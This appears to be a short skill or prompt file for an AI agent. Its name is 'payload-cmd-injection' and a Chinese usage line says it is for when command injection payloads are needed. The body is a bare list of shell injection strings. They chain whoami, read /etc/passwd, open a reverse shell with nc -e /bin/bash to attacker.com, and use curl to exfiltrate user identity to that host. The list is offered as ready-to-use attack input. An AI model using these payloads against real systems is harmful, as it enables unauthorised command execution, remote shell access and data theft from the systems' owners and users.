---
name: payload-cmd-injection
when_to_use: 需要命令注入 payload
---
# Command Injection
; whoami
| whoami
& whoami
`whoami`
; cat /etc/passwd
| nc -e /bin/bash attacker.com 4444
&& curl http://attacker.com/$(whoami)
`curl http://attacker.com/$(id)`
